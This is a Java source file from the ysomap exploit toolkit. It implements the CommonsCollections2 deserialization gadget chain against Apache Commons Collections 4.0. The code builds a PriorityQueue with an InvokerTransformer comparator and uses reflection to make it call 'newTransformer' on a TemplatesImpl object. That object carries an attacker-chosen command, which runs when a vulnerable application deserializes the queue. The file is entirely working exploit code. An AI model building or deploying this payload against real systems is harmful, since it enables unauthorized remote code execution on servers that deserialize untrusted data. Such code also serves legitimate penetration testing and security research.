package ysomap.core.gadget.payload.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;
import ysomap.core.ObjectGadget;
import ysomap.core.gadget.bullet.jdk.TemplatesImplBullet;
import ysomap.core.bean.Payload;
import ysomap.util.ReflectionHelper;

import java.util.PriorityQueue;
import java.util.Queue;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Authors({ Authors.FROHOFF })
@Require(bullets = {"TemplatesImplBullet"})
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CommonsCollections2 extends Payload<Queue<Object>> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public Queue<Object> pack(Object obj) throws Exception {
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
        queueArray[0] = obj;// arm bullet
        queueArray[1] = 1;

        return queue;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        return new TemplatesImplBullet().set("body", command);
    }
}
